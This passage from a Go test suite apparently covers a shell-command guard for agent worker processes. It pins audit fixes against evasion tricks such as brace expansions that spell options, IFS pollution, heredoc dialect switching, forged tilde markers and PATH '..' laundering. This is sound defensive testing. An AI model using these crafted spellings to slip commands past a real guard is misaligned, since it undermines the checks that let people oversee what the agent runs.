			t.Fatalf("subCollector.wordToArg($HOME) under HOME=/root = (%q, %v), want (/root, false)", s, static)
		}
		if !isSingleWordOptionValue(s) {
			t.Fatalf("isSingleWordOptionValue(%q) = false, want true — a whitespace/glob-free absolute HOME expands to exactly one field", s)
		}
	})

	// ---- R16-M4: ~/... path restoration never fabricates /root ----
	t.Run("R16-M4 relative HOME never resolves to /root", func(t *testing.T) {
		t.Setenv("HOME", "relative-home")
		w := parseBashSingleCmdWord(t, `echo ~/notes`, 1)
		s, _ := blankSubCollector().wordToArg(w)
		cand, ok := resolveNodeRunnerPathOpt(s, "/opt/example")
		if ok && cand == "/root/notes" {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, true) — a relative inherited HOME must never fabricate /root/notes; bash would expand ~ against the caller cwd instead", s, cand)
		}
		if ok {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, true), want ok=false — a relative inherited HOME cannot anchor an absolute path", s, cand)
		}
	})
	t.Run("R16-M4-pos absolute HOME keeps the restoration", func(t *testing.T) {
		// An isolated fake home inside t.TempDir() (isTmpOrScratchPath
		// honours testTrustedHomeRoot) keeps the grant end-to-end.
		t.Setenv("HOME", "/home/user")
		w := parseBashSingleCmdWord(t, `echo ~/notes`, 1)
		s, _ := blankSubCollector().wordToArg(w)
		cand, ok := resolveNodeRunnerPathOpt(s, "/opt/example")
		if !ok || cand != "/home/user/notes" {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, %v), want (/home/user/notes, true)", s, cand, ok)
		}
	})

	// ---- R16-S1: quoted literal braces in ordinary globs stay safe ----
	t.Run("R16-S1 quoted literal brace glob is a safe data operand", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `cat docs/'{v1}'/*.txt`, 1)
		if wordBraceExpHit(w) {
			t.Fatal("wordBraceExpHit(docs/'{v1}'/*.txt) = true, want false — the braces are single-quoted literal text, never an expansion")
		}
		s1, static1 := wordToArg(w)
		if static1 {
			t.Fatalf("wordToArg(docs/'{v1}'/*.txt) = (%q, true), want dynamic (the *.txt glob)", s1)
		}
		if !isSafeDynamicDataOperand(s1) {
			t.Fatalf("isSafeDynamicDataOperand(%q) = false, want true — every match keeps the fixed docs/ prefix and {v1} is a literal directory", s1)
		}
		s2, static2 := blankSubCollector().wordToArg(w)
		if static2 {
			t.Fatalf("subCollector.wordToArg(docs/'{v1}'/*.txt) = (%q, true), want dynamic", s2)
		}
		if !isSafeDynamicDataOperand(s2) {
			t.Fatalf("isSafeDynamicDataOperand(%q) = false, want true (collector encoding)", s2)
		}
	})
	t.Run("R16-S1-pos real brace words keep the refusal", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `echo {docs/a,-blue}`, 1)
		s, _ := wordToArg(w)
		if isSafeDynamicDataOperand(s) {
			t.Fatalf("isSafeDynamicDataOperand(%q) = true, want false — a real brace expansion's sibling branches can spell options", s)
		}
		s2, _ := blankSubCollector().wordToArg(w)
		if isSafeDynamicDataOperand(s2) {
			t.Fatalf("isSafeDynamicDataOperand(%q) = true, want false (collector encoding)", s2)
		}
	})

	// ---- R16-S2: dash write pre-scan skips the bash brace scan ----
	t.Run("R16-S2 dash printf combination script stays bound", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R16-S2", role: "worker", cmd: `cmd=/bin/true; printf tag{red,blue}; "$cmd"`}, "")
		if got != "ALLOW" {
			t.Fatalf("rtGuardCwd(dash combination script) = %q, want ALLOW — dash treats the brace word as a zero-argument literal format, so nothing can be written", got)
		}
	})

	// ---- R16-S3: mechanical AST/verification of the case tables ----
	t.Run("R16-S3 R14 allow table is exactly 6 rows disjoint from R13", func(t *testing.T) {
		// The allow rows are (name, cmd) struct literals: the cmd is the
		// second back-quoted string of each row — the walk extracts them
		// positionally (every row here carries exactly two strings).
		extractRows := func(funcName string) (block int, allow int, cmds []string) {
			fset := token.NewFileSet()
			f, err := parser.ParseFile(fset, "zz_r2fix_test.go", nil, 0)
			if err != nil {
				t.Fatalf("parse zz_r2fix_test.go: %v", err)
			}
			for _, decl := range f.Decls {
				fn, ok := decl.(*ast.FuncDecl)
				if !ok || fn.Name.Name != funcName {
					continue
				}
				ast.Inspect(fn.Body, func(n ast.Node) bool {
					assign, ok := n.(*ast.AssignStmt)
					if !ok || len(assign.Lhs) != 1 || len(assign.Rhs) != 1 {
						return true
					}
					ident, ok := assign.Lhs[0].(*ast.Ident)
					if !ok {
						return true
					}
					comp, ok := assign.Rhs[0].(*ast.CompositeLit)
					if !ok {
						return true
					}
					rowCmds := func() []string {
						var cmdsOut []string
						for _, el := range comp.Elts {
							row, ok := el.(*ast.CompositeLit)
							if !ok {
								continue
							}
							var lits []string
							for _, v := range row.Elts {
								if bl, ok := v.(*ast.BasicLit); ok && bl.Kind == token.STRING {
									if unq, err := strconv.Unquote(bl.Value); err == nil {
										lits = append(lits, unq)
									}
								}
							}
							if len(lits) >= 2 {
								cmdsOut = append(cmdsOut, lits[1])
							}
						}
						return cmdsOut
					}
					switch ident.Name {
					case "blockCases":
						block = len(comp.Elts)
					case "allowCases":
						allow = len(comp.Elts)
						cmds = rowCmds()
					}
					return true
				})
			}
			return block, allow, cmds
		}
		block14, allow14, cmds14 := extractRows("TestGuard_V622_OracleR14Probes")
		_, _, cmds13 := extractRows("TestGuard_V622_OracleR13Probes")
		if block14 != 4 || allow14 != 6 {
			t.Fatalf("R14 tables = (%d block, %d allow), want (4, 6)", block14, allow14)
		}
		if len(cmds14) != 6 || len(cmds13) != 10 {
			t.Fatalf("extracted cmd counts = (%d R14, %d R13), want (6, 10)", len(cmds14), len(cmds13))
		}
		set13 := map[string]bool{}
		for _, c := range cmds13 {
			set13[c] = true
		}
		for _, c := range cmds14 {
			if set13[c] {
				t.Fatalf("R14 allow cmd %q duplicates an R13 allow row — two byte-identical rows cannot count as two independent evidences", c)
			}
		}
	})
}

// TestGuard_V622_OracleR17Probes pins the Oracle R17 audit closure:
// the mktemp grants additionally require the effective PATH to resolve an
// executable mktemp (R17-M1), local bash heredoc / here-string stdin
// re-parses keep the bash dialect instead of falling back to dash
// (R17-M2), the unquoted-$HOME single-word proof collapses the moment IFS
// is polluted (R17-M3), ~/... restoration demands both the real tilde
// marker and an untainted expansion environment (R17-M4), locateShellCSlot
// skips the `--` terminator after a pending -c exactly like
// unwrapShellArgv (R17-M5), nested -c stdin classification no longer
// drops plain data consumers (R17-M6), a multi-glob path with quoted
// literal braces is never a brace expansion (R17-S1) and /dev/shm is a
// valid tmpfs TMPDIR (R17-S2). Pure-function pins reference only
// production symbols that exist verbatim on the pre-fix tree 841473c
// (the consumer predicates, the collectors, unwrapShellArgv,
// locateShellCSlot, scriptAllowsLocalShellStdinPrepareDialect and
// stdinProgramTargetsWithEnv), so the discriminating rows reproduce FAIL
// directly there.
func TestGuard_V622_OracleR17Probes(t *testing.T) {
	// ---- R17-M1: a missing mktemp on the effective PATH revokes the grants ----
	t.Run("R17-M1-a dq grant requires PATH resolvable mktemp", func(t *testing.T) {
		// /usr/local/sbin is verified root-owned without mktemp on this
		// host (Oracle R17 read-only metadata check); TMPDIR=/tmp is
		// valid, so only the missing lookup can revoke the grant.
		t.Setenv("TMPDIR", "/tmp")
		t.Setenv("PATH", "/usr/local/sbin")
		w := parseBashSingleCmdWord(t, `echo "$(mktemp -d)"`, 1)
		s, static := blankSubCollector().wordToArg(w)
		if static {
			t.Fatalf("wordToArg(\"$(mktemp -d)\") static under mktemp-less PATH")
		}
		if strings.Contains(s, cmdSubPlaceholderAbsDq) {
			t.Fatalf("encoding %q carries the abs-dq class under PATH=/usr/local/sbin, want the ordinary quoted placeholder (mktemp is not runnable there)", s)
		}
		if dynGluedTailNonEmpty(s) {
			t.Fatalf("dynGluedTailNonEmpty(%q) = true, want false — a failing substitution is empty", s)
		}
	})
	t.Run("R17-M1-b assignment binding requires PATH resolvable mktemp", func(t *testing.T) {
		t.Setenv("TMPDIR", "/tmp")
		t.Setenv("PATH", "/usr/local/sbin")
		p := syntax.NewParser(syntax.Variant(syntax.LangBash))
		f, err := p.Parse(strings.NewReader(`d=$(mktemp -d)`), "")
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		call, ok := f.Stmts[0].Cmd.(*syntax.CallExpr)
		if !ok || len(call.Assigns) != 1 || call.Assigns[0].Value == nil {
			t.Fatalf("parse shape %T, want one Assign with a value", f.Stmts[0].Cmd)
		}
		v, ok := blankSubCollector().staticAssignVal(call.Assigns[0].Value)
		if ok && v == mktempDirPlaceholder {
			t.Fatalf("staticAssignVal($(mktemp -d)) under PATH=/usr/local/sbin = (%q, true), want the mktemp-dir grant withheld — the child cannot even be exec'd there", v)
		}
	})
	t.Run("R17-M1-pos normal PATH keeps the grants", func(t *testing.T) {
		t.Setenv("TMPDIR", "")
		t.Setenv("PATH", "/usr/bin:/bin")
		w := parseBashSingleCmdWord(t, `echo "$(mktemp -d)"`, 1)
		s, _ := blankSubCollector().wordToArg(w)
		if !strings.Contains(s, cmdSubPlaceholderAbsDq) {
			t.Fatalf("encoding %q lost the abs-dq class under PATH=/usr/bin:/bin, want it kept (/usr/bin/mktemp is executable)", s)
		}
		p := syntax.NewParser(syntax.Variant(syntax.LangBash))
		f, err := p.Parse(strings.NewReader(`d=$(mktemp -d)`), "")
		if err != nil {
			t.Fatalf("parse: %v", err)
		}
		call := f.Stmts[0].Cmd.(*syntax.CallExpr)
		v, ok := blankSubCollector().staticAssignVal(call.Assigns[0].Value)
		if !ok || v != mktempDirPlaceholder {
			t.Fatalf("staticAssignVal($(mktemp -d)) under PATH=/usr/bin:/bin = (%q, %v), want (%q, true)", v, ok, mktempDirPlaceholder)
		}
	})

	// ---- R17-M2: bash heredoc / here-string keep the bash dialect ----
	t.Run("R17-M2-api bash API stdin keeps the bash dialect (control)", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R17-M2-api", role: "worker", argv: []string{"bash"}, stdin: "printf tag{red,blue}\n"}, "")
		if !strings.Contains(got, "env dynamic printf") {
			t.Fatalf("bash API stdin path = %q, want substring %q", got, "env dynamic printf")
		}
	})
	t.Run("R17-M2-hd bash heredoc keeps the bash dialect", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R17-M2-hd", role: "worker", cmd: "bash -c 'bash <<\"EOF\"\nprintf tag{red,blue}\nEOF'"}, "")
		if !strings.Contains(got, "env dynamic printf") {
			t.Fatalf("bash heredoc path = %q, want substring %q — a bash reading its program from a heredoc brace-expands exactly like bash -c", got, "env dynamic printf")
		}
	})
	t.Run("R17-M2-hs bash here-string keeps the bash dialect", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "R17-M2-hs", role: "worker", cmd: "bash -c 'bash <<< \"printf tag{red,blue}\"'"}, "")
		if !strings.Contains(got, "env dynamic printf") {
			t.Fatalf("bash here-string path = %q, want substring %q", got, "env dynamic printf")
		}
	})
	t.Run("R17-M2-pos dash heredoc / here-string keep the POSIX literal", func(t *testing.T) {
		for _, cmd := range []string{
			"bash -c 'sh <<\"EOF\"\nprintf tag{red,blue}\nEOF'",
			"bash -c 'sh <<< \"printf tag{red,blue}\"'",
		} {
			got := rtGuardCwd(t, rtCase{id: "R17-M2-pos", role: "worker", cmd: cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("dash stdin path %q = %q, want ALLOW — dash performs no brace expansion", cmd, got)
			}
		}
	})

	// ---- R17-M3: a polluted IFS revokes the unquoted-$HOME single-word proof ----
	ifsFixture := func(t *testing.T, script string, argIdx int) string {
		t.Helper()
		segs, ok := parseSubagentShellASTEnv(script, 0, false, true, nil, callerIdentity{})
		if !ok || len(segs) == 0 {
			t.Fatalf("parse %q failed: ok=%v segs=%v", script, ok, segs)
		}
		last := segs[len(segs)-1]
		if argIdx >= len(last.argv) {
			t.Fatalf("parse %q: last seg argv=%v, want index %d", script, last.argv, argIdx)
		}
		return last.argv[argIdx]
	}
	t.Run("R17-M3 IFS=':' degrades unquoted HOME but keeps the quoted word", func(t *testing.T) {
		t.Setenv("HOME", "/home/red:blue")
		unq := ifsFixture(t, "IFS=:; echo $HOME", 1)
		quo := ifsFixture(t, "IFS=:; echo \"$HOME\"", 1)
		if isSingleWordOptionValue(unq) {
			t.Fatalf("isSingleWordOptionValue(%q) = true, want false — unquoted $HOME field-splits on ':' at runtime", unq)
		}
		if !isSingleWordOptionValue(quo) {
			t.Fatalf("isSingleWordOptionValue(%q) = false, want true — a double-quoted expansion is exactly one argv word regardless of IFS", quo)
		}
	})
	t.Run("R17-M3-pos untainted IFS keeps the unquoted literal text", func(t *testing.T) {
		t.Setenv("HOME", "/home/red:blue")
		unq := ifsFixture(t, "echo $HOME", 1)
		if !isSingleWordOptionValue(unq) {
			t.Fatalf("isSingleWordOptionValue(%q) = false, want true — a whitespace/glob-free HOME expands to one field under the default IFS", unq)
		}
	})

	// ---- R17-M4: tilde restoration needs the marker AND the environment ----
	t.Run("R17-M4-a unmarked literal ~/notes never resolves to the service HOME", func(t *testing.T) {
		t.Setenv("HOME", "/home/parent")
		cand, ok := resolveNodeRunnerPathOpt("~/notes", "/opt/example")
		if ok && cand == "/home/parent/notes" {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, true) — a direct argv or single-quoted word reaches the consumer VERBATIM and must never be home-restored", "~/notes", cand)
		}
		if ok && cand != "/opt/example/~/notes" {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, true), want ok=false or the cwd-relative %q", "~/notes", cand, "/opt/example/~/notes")
		}
	})
	t.Run("R17-M4-b tainted HOME revokes the tilde restoration", func(t *testing.T) {
		t.Setenv("HOME", "/home/parent")
		w := parseBashSingleCmdWord(t, `echo ~/notes`, 1)
		col := blankSubCollector()
		col.taintedVars["HOME"] = true
		s, _ := col.wordToArg(w)
		cand, ok := resolveNodeRunnerPathOpt(s, "/opt/example")
		if ok && cand == "/home/parent/notes" {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, true) — the service HOME must never stand in for the consuming shell's tainted HOME", s, cand)
		}
		if ok {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, true), want ok=false under a tainted HOME", s, cand)
		}
	})
	t.Run("R17-M4-pos untainted tilde expansion keeps the restoration", func(t *testing.T) {
		t.Setenv("HOME", "/home/user")
		w := parseBashSingleCmdWord(t, `echo ~/notes`, 1)
		s, _ := blankSubCollector().wordToArg(w)
		cand, ok := resolveNodeRunnerPathOpt(s, "/opt/example")
		if !ok || cand != "/home/user/notes" {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, %v), want (/home/user/notes, true)", s, cand, ok)
		}
	})

	// ---- R17-M5: locateShellCSlot skips the terminator after a pending -c ----
	t.Run("R17-M5 located slot equals the unwrapped script text", func(t *testing.T) {
		argv := []string{"bash", "-c", "--", "echo ok"}
		idx, rawScript, glued, ok := locateShellCSlot(argv)
		text, has := unwrapShellArgv(argv)
		if !has || text != "echo ok" {
			t.Fatalf("unwrapShellArgv(%v) = (%q, %v), want (echo ok, true)", argv, text, has)
		}
		if !ok || glued {
			t.Fatalf("locateShellCSlot(%v) = (%d, %q, glued=%v, ok=%v), want a clean unglued slot", argv, idx, rawScript, glued, ok)
		}
		if idx != 3 || rawScript != "echo ok" || argv[idx] != rawScript {
			t.Fatalf("locateShellCSlot(%v) = (%d, %q), want (3, echo ok) with argv[idx] == rawScript == unwrap text", argv, idx, rawScript)
		}
	})
	t.Run("R17-M5-pos dash terminator spellings locate the same word", func(t *testing.T) {
		for _, argv := range [][]string{
			{"sh", "-c", "echo ok"},
			{"bash", "-c", "-", "echo ok"},
			{"bash", "--rcfile", "/dev/null", "-c", "--", "echo ok"},
		} {
			idx, rawScript, glued, ok := locateShellCSlot(argv)
			text, has := unwrapShellArgv(argv)
			if !ok || glued || !has || rawScript != text || argv[idx] != rawScript {
				t.Fatalf("locateShellCSlot(%v) = (%d, %q, glued=%v, ok=%v) vs unwrap=(%q,%v), want the same clean script word", argv, idx, rawScript, glued, ok, text, has)
			}
		}
	})
	t.Run("R17-M5-neg glued cluster tails stay unrewritable", func(t *testing.T) {
		for _, argv := range [][]string{
			{"sh", "-ce", "echo ok"},
			{"sh", "-co", "vi", "echo ok"},
		} {
			_, _, glued, ok := locateShellCSlot(argv)
			if !glued || !ok {
				t.Fatalf("locateShellCSlot(%v) glued=%v ok=%v, want a glued-but-decoded verdict", argv, glued, ok)
			}
		}
	})

	// ---- R17-M6: nested stdin classification keeps data consumers ----
	t.Run("R17-M6 flat and nested cat+bash both refuse the rewrite", func(t *testing.T) {
		_, flatOK, _ := scriptAllowsLocalShellStdinPrepareDialect("cat; bash", false, envAssignments{}, "", callerIdentity{})
		if flatOK {
			t.Fatal("flat 'cat; bash' permits a stdin program rewrite, want ok=false (the stream is partly data)")
		}
		targets := stdinProgramTargetsWithEnv([]string{"bash", "-c", "cat; bash"}, 0, envAssignments{}, "", callerIdentity{})
		_, nestedOK, nestedBash := stdinSingleShellTargetDialect(targets, false)
		if nestedOK {
			t.Fatalf("nested 'bash -c \"cat; bash\"' targets permit a stdin program rewrite (bash=%v), want ok=false — the inner cat must not vanish from the summary", nestedBash)
		}
	})
	t.Run("R17-M6-pos pure nested shell targets keep the rewrite", func(t *testing.T) {
		targets := stdinProgramTargetsWithEnv([]string{"bash", "-c", "sh; bash"}, 0, envAssignments{}, "", callerIdentity{})
		if _, mixedOK, _ := stdinSingleShellTargetDialect(targets, false); mixedOK {
			t.Fatal("mixed sh+bash consumers permit a stdin rewrite, want ok=false (R16 dialect agreement)")
		}
		pure := stdinProgramTargetsWithEnv([]string{"bash", "-c", "bash; bash"}, 0, envAssignments{}, "", callerIdentity{})
		envs, ok, bash := stdinSingleShellTargetDialect(pure, false)
		if !ok || len(envs) == 0 || !bash {
			t.Fatalf("pure nested bash targets = (envs=%d, ok=%v, bash=%v), want (>=1, true, true)", len(envs), ok, bash)
		}
	})

	// ---- R17-S1: two ordinary glob fragments are not a brace expansion ----
	t.Run("R17-S1 multi-glob quoted-brace path stays a safe data operand", func(t *testing.T) {
		w := parseBashSingleCmdWord(t, `cat docs/*/'{v1}'/*.txt`, 1)
		if wordBraceExpHit(w) {
			t.Fatal("wordBraceExpHit(docs/*/'{v1}'/*.txt) = true, want false — the braces are single-quoted literal text")
		}
		s1, _ := wordToArg(w)
		if strings.Contains(s1, cmdSubPlaceholderGlob+cmdSubPlaceholderGlob) {
			t.Fatalf("wordToArg encoding %q carries adjacent glob markers, want the two glob fragments SEPARATED by the static infix", s1)
		}
		if !isSafeDynamicDataOperand(s1) {
			t.Fatalf("isSafeDynamicDataOperand(%q) = false, want true — every match keeps the fixed docs/ prefix and {v1} is a literal directory", s1)
		}
		s2, _ := blankSubCollector().wordToArg(w)
		if !isSafeDynamicDataOperand(s2) {
			t.Fatalf("isSafeDynamicDataOperand(%q) = false, want true (collector encoding)", s2)
		}
	})
	t.Run("R17-S1-neg real brace expansions keep the refusal", func(t *testing.T) {
		for _, src := range []string{`echo {docs/a,-blue}`, `echo ~/{red,blue}`} {
			w := parseBashSingleCmdWord(t, src, 1)
			s1, _ := wordToArg(w)
			if !strings.Contains(s1, cmdSubPlaceholderGlob+cmdSubPlaceholderGlob) {
				t.Fatalf("wordToArg(%q) = %q, want the adjacent glob-pair encoding of a real brace expansion", src, s1)
			}
			if isSafeDynamicDataOperand(s1) {
				t.Fatalf("isSafeDynamicDataOperand(%q) = true, want false — a real brace expansion's sibling branches can spell options", s1)
			}
			s2, _ := blankSubCollector().wordToArg(w)
			if isSafeDynamicDataOperand(s2) {
				t.Fatalf("isSafeDynamicDataOperand(%q) = true, want false (collector encoding)", s2)
			}
		}
	})

	// ---- R17-S2: /dev/shm is a valid tmpfs TMPDIR ----
	t.Run("R17-S2 TMPDIR=/dev/shm keeps the success proof", func(t *testing.T) {
		st, err := os.Stat("/dev/shm")
		if err != nil || !st.IsDir() || st.Mode().Perm() != 0o777 || st.Mode()&os.ModeSticky == 0 {
			t.Skipf("/dev/shm not a 1777 tmpfs directory on this host: %v", err)
		}
		t.Setenv("TMPDIR", "/dev/shm")
		if !inheritedTmpdirValid() {
			t.Fatal("inheritedTmpdirValid() = false under TMPDIR=/dev/shm, want true — /dev/shm is a real 1777 tmpfs scratch root")
		}
		got := rtGuardCwd(t, rtCase{id: "R17-S2", role: "worker", cmd: `out=$(mktemp -d); tar -czf "$out/archive.tgz" -C /tmp/src .`}, "")
		if got != "ALLOW" {
			t.Fatalf("rtGuardCwd(mktemp success path under TMPDIR=/dev/shm) = %q, want ALLOW", got)
		}
	})
	t.Run("R17-S2-neg /proc /dev/null /dev/pts stay rejected", func(t *testing.T) {
		for _, td := range []string{"/proc", "/sys", "/dev/null", "/dev/pts"} {
			t.Setenv("TMPDIR", td)
			if inheritedTmpdirValid() {
				t.Fatalf("inheritedTmpdirValid() = true under TMPDIR=%s, want false", td)
			}
		}
	})
}

// TestGuard_V622_OracleR18Probes pins the Oracle R18 audit closure:
// PATH lookups must reproduce the kernel's per-component resolution
// instead of lexically cleaning `..` away (R18-M1), local heredoc and
// here-string payloads are screened against EVERY program target in an
// order-independent way (R18-M2), a static eval's variable writes ride
// back into the enclosing collector's write scan (R18-M3), the tilde
// restoration requires the unforgeable NUL-provenanced marker while the
// word-count proof survives a tainted HOME independently (R18-M4/S5),
// the TMPDIR pseudo-root review is component-exact plus symlink-resolved
// (R18-M5/S3), the -c slot scanner keeps a pending -c across a later
// independent cluster (R18-S1), nested pure-assignment segments consume
// no stdin and never mint a data consumer (R18-S2), and the dash dialect
// rides into command-substitution collectors (R18-S4). Pure-function pins
// reference only production symbols that exist verbatim on the pre-fix
// tree 8c9447a (pathHasExecutable, the screen*Depth helpers,
// parseSubagentShellASTEnv, isSingleWordOptionValue,
// resolveNodeRunnerPathOpt, printfFmtWriteSlots, inheritedTmpdirValid,
// tmpdirPseudoRoot, locateShellCSlot, stdinProgramTargetsWithEnv and
// stdinSingleShellTargetDialect), so the discriminating rows reproduce
// FAIL directly there.
func TestGuard_V622_OracleR18Probes(t *testing.T) {
	// ---- R18-M1: the PATH lookup must not lexically clean `..` ----
	t.Run("R18-M1 /usr/bin/true/.. can never yield mktemp", func(t *testing.T) {
		// Host preconditions from the Oracle R18 read-only metadata check:
		// /usr/bin/true is a regular file and /usr/bin/mktemp is an
		// executable regular file, so /usr/bin/true/../mktemp CANNOT be
		// traversed by the kernel (ENOTDIR at the true component) even
		// though the lexically cleaned /usr/bin/mktemp exists.
		if st, err := os.Stat("/usr/bin/true"); err != nil || st.IsDir() {
			t.Skipf("/usr/bin/true not a regular file: %v", err)
		}
		if st, err := os.Stat("/usr/bin/mktemp"); err != nil || st.IsDir() || st.Mode()&0111 == 0 {
			t.Skipf("/usr/bin/mktemp not executable: %v", err)
		}
		if pathHasExecutable("/usr/bin/true/..", "mktemp") {
			t.Fatal("pathHasExecutable(/usr/bin/true/.., mktemp) = true, want false — the kernel resolves true as a regular file and rejects the traversal with ENOTDIR; a lexical filepath.Join must never launder it into /usr/bin")
		}
	})
	t.Run("R18-M1-pos genuine PATH directories keep resolving executables", func(t *testing.T) {
		if !pathHasExecutable("/usr/bin", "mktemp") {
			t.Fatal("pathHasExecutable(/usr/bin, mktemp) = false, want true")
		}
		if !pathHasExecutable("/usr/bin/", "mktemp") {
			t.Fatal("pathHasExecutable(/usr/bin/, mktemp) = false, want true — a trailing slash is the same directory")
		}
	})

	// ---- R18-M2: every program target of a heredoc / here-string is screened ----
	t.Run("R18-M2 here-string verdict is branch-order independent", func(t *testing.T) {
		// Both shells share the same here-string; either of them may consume
		// it (mutually exclusive branches), so the bash target must face the
		// bash dialect screen regardless of which target sorts first.
		for _, inner := range []string{"dash; bash", "bash; dash"} {
			seg := shellSegment{
				argv:       []string{"sh", "-c", inner},
				hereString: "printf tag{red,blue}",
			}
			hit := screenOneSegmentDepth(seg, 's', 0, callerIdentity{})
			if !strings.Contains(hit, "env dynamic printf") {
				t.Fatalf("screenOneSegmentDepth(sh -c %q <<< printf tag{red,blue}) = %q, want substring %q — either shell may consume the stream and bash brace-expands it", inner, hit, "env dynamic printf")
			}
		}
	})
	t.Run("R18-M2-pos pure dash here-string consumers keep the POSIX literal", func(t *testing.T) {
		seg := shellSegment{
			argv:       []string{"sh", "-c", "dash; dash"},
			hereString: "printf tag{red,blue}",
		}
		if hit := screenOneSegmentDepth(seg, 's', 0, callerIdentity{}); hit != "" {
			t.Fatalf("screenOneSegmentDepth(sh -c 'dash; dash' <<< printf tag{red,blue}) = %q, want no hit — dash performs no brace expansion", hit)
		}
	})
	t.Run("R18-M2-hd heredoc verdict is branch-order independent", func(t *testing.T) {
		for _, inner := range []string{"dash; bash", "bash; dash"} {
			seg := shellSegment{
				argv: []string{"sh", "-c", inner},
				heredocText: []heredocBody{
					{text: "printf tag{red,blue}", quoted: true},
				},
			}
			hit := screenSegmentHeredocsDepth(seg, 's', 0, callerIdentity{})
			if !strings.Contains(hit, "env dynamic printf") {
				t.Fatalf("screenSegmentHeredocsDepth(sh -c %q <<EOF printf tag{red,blue}) = %q, want substring %q", inner, hit, "env dynamic printf")
			}
		}
	})
	t.Run("R18-M2-hd-pos pure dash heredoc consumers keep the POSIX literal", func(t *testing.T) {
		seg := shellSegment{
			argv: []string{"sh", "-c", "dash; dash"},
			heredocText: []heredocBody{
				{text: "printf tag{red,blue}", quoted: true},
			},
		}
		if hit := screenSegmentHeredocsDepth(seg, 's', 0, callerIdentity{}); hit != "" {
			t.Fatalf("screenSegmentHeredocsDepth(sh -c 'dash; dash' <<EOF printf tag{red,blue}) = %q, want no hit", hit)
		}
	})

	// ---- R18-M3: a static eval's IFS write rides back into the collector ----
	ifsFixture := func(t *testing.T, script string, argIdx int) string {
		t.Helper()
		segs, ok := parseSubagentShellASTEnv(script, 0, false, true, nil, callerIdentity{})
		if !ok || len(segs) == 0 {
			t.Fatalf("parse %q failed: ok=%v segs=%v", script, ok, segs)
		}
		last := segs[len(segs)-1]
		if argIdx >= len(last.argv) {
			t.Fatalf("parse %q: last seg argv=%v, want index %d", script, last.argv, argIdx)
		}
		return last.argv[argIdx]
	}
	t.Run("R18-M3 eval IFS write degrades the unquoted HOME exactly like the direct assignment", func(t *testing.T) {
		t.Setenv("HOME", "/home/red:blue")
		direct := ifsFixture(t, "IFS=:; echo $HOME", 1)
		viaEval := ifsFixture(t, "eval 'IFS=:'; echo $HOME", 1)
		if isSingleWordOptionValue(direct) {
			t.Fatalf("control broken: direct IFS=: unquoted $HOME %q is single-word, want false", direct)
		}
		if isSingleWordOptionValue(viaEval) != isSingleWordOptionValue(direct) {
			t.Fatalf("isSingleWordOptionValue(eval spelling %q) = %v vs direct spelling %q = %v — eval re-parses in the SAME shell, so its IFS write must reach the outer collector", viaEval, isSingleWordOptionValue(viaEval), direct, isSingleWordOptionValue(direct))
		}
		if isSingleWordOptionValue(viaEval) {
			t.Fatalf("isSingleWordOptionValue(%q) = true after eval 'IFS=:', want false — unquoted $HOME field-splits on ':' at runtime", viaEval)
		}
	})
	t.Run("R18-M3-pos double-quoted HOME is unaffected by the eval IFS write", func(t *testing.T) {
		t.Setenv("HOME", "/home/red:blue")
		quo := ifsFixture(t, "eval 'IFS=:'; echo \"$HOME\"", 1)
		if !isSingleWordOptionValue(quo) {
			t.Fatalf("isSingleWordOptionValue(%q) = false, want true — double quotes suppress field splitting entirely regardless of IFS", quo)
		}
	})
	t.Run("R18-M3-dyn dynamic eval operands conservatively pollute IFS", func(t *testing.T) {
		t.Setenv("HOME", "/home/red:blue")
		unq := ifsFixture(t, "eval \"$X\"; echo $HOME", 1)
		if isSingleWordOptionValue(unq) {
			t.Fatalf("isSingleWordOptionValue(%q) = true after a dynamic eval, want false — the re-parsed text is unknowable, so IFS may be polluted", unq)
		}
	})

	// ---- R18-M4: the tilde restoration demands unforgeable provenance ----
	t.Run("R18-M4 a literal spelling of the printable marker never resolves to the service HOME", func(t *testing.T) {
		t.Setenv("HOME", "/home/parent")
		w := parseBashSingleCmdWord(t, "echo '~__ctx_glob__/notes'", 1)
		s, _ := blankSubCollector().wordToArg(w)
		cand, ok := resolveNodeRunnerPathOpt(s, "/opt/example")
		if ok && cand == "/home/parent/notes" {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, true) — the bytes arrived as a single-quoted LITERAL, not a tilde expansion, so the service HOME must never be restored into them", s, cand)
		}
		if ok {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, true), want ok=false — the printable glob marker is forgeable evidence, never provenance", s, cand)
		}
	})
	t.Run("R18-M4-pos a real untainted tilde expansion keeps the restoration", func(t *testing.T) {
		t.Setenv("HOME", "/home/user")
		w := parseBashSingleCmdWord(t, `echo ~/notes`, 1)
		s, _ := blankSubCollector().wordToArg(w)
		cand, ok := resolveNodeRunnerPathOpt(s, "/opt/example")
		if !ok || cand != "/home/user/notes" {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, %v), want (/home/user/notes, true) — a genuine word-start tilde under a known HOME mints the unforgeable marker", s, cand, ok)
		}
	})
	t.Run("R18-M4-b tainted-HOME tilde keeps failing path restoration closed", func(t *testing.T) {
		t.Setenv("HOME", "/home/parent")
		w := parseBashSingleCmdWord(t, `echo ~/notes`, 1)
		col := blankSubCollector()
		col.taintedVars["HOME"] = true
		s, _ := col.wordToArg(w)
		cand, ok := resolveNodeRunnerPathOpt(s, "/opt/example")
		if ok {
			t.Fatalf("resolveNodeRunnerPathOpt(%q) = (%q, true), want ok=false under a tainted HOME (R17-M4-b is preserved)", s, cand)
		}
	})

	// ---- R18-M5: the TMPDIR exception is judged on the resolved object ----
	t.Run("R18-M5 the /dev/shm spellings of /dev and /dev/mqueue are rejected", func(t *testing.T) {
